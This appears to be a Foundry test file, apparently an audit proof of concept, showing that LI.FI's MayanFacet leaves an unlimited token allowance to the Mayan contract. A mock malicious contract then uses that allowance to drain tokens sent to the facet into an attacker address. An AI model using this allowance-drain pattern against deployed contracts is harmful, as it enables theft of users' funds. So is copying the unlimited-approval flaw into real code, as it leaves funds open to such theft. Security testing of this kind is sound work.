// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import {Test} from "forge-std/Test.sol";
import {MockERC20} from "solmate/test/utils/mocks/MockERC20.sol";
import {MayanFacet} from "lifi/Facets/MayanFacet.sol";
import {IMayan} from "lifi/Interfaces/IMayan.sol";
import {ILiFi} from "lifi/Interfaces/ILiFi.sol";

contract MaliciousMayan is IMayan {
    address public token;

    constructor(address _token) {
        token = _token;
    }

    function forwardEth(address, bytes calldata) external payable override {}

    function forwardERC20(address, uint256 amount, IMayan.PermitParams calldata, address, bytes calldata)
        external
        payable
        override
    {
        MockERC20(token).transferFrom(msg.sender, address(this), amount);
    }

    function drain(address from, address to, uint256 amount) external {
        MockERC20(token).transferFrom(from, to, amount);
    }
}

contract MayanFacetAllowanceTest is Test {
    MockERC20 internal token;
    MaliciousMayan internal mayan;
    MayanFacet internal facet;
    address internal attacker = address(0xbeef);

    function setUp() public {
        token = new MockERC20("Mock", "MOCK", 18);
        mayan = new MaliciousMayan(address(token));
        facet = new MayanFacet(IMayan(address(mayan)));

        token.mint(address(this), 100 ether);
        token.approve(address(facet), type(uint256).max);
    }

    function test_UnlimitedAllowanceAllowsTokenDrain() public {
        ILiFi.BridgeData memory bridgeData = ILiFi.BridgeData({
            transactionId: bytes32("tx"),
            bridge: "",
            integrator: "",
            referrer: address(0),
            sendingAssetId: address(token),
            receiver: address(this),
            minAmount: 10 ether,
            destinationChainId: 2,
            hasSourceSwaps: false,
            hasDestinationCall: false
        });

        bytes memory protocolData = abi.encodeWithSelector(
            bytes4(0x94454a5d),
            address(0),
            uint256(0),
            uint64(0),
            uint64(0),
            bytes32(uint256(uint160(address(this)))),
            abi.encode(uint32(0), bytes32(0), bytes32(0))
        );

        MayanFacet.MayanData memory mayanData = MayanFacet.MayanData({
            nonEVMReceiver: bytes32(0),
            mayanProtocol: address(0x1234),
            protocolData: protocolData
        });

        facet.startBridgeTokensViaMayan(bridgeData, mayanData);

        // allowance remains set to max
        assertEq(token.allowance(address(facet), address(mayan)), type(uint256).max);

        // attacker sends tokens to facet and mayan drains them
        token.mint(address(facet), 5 ether);
        mayan.drain(address(facet), attacker, 5 ether);

        assertEq(token.balanceOf(attacker), 5 ether);
    }
}
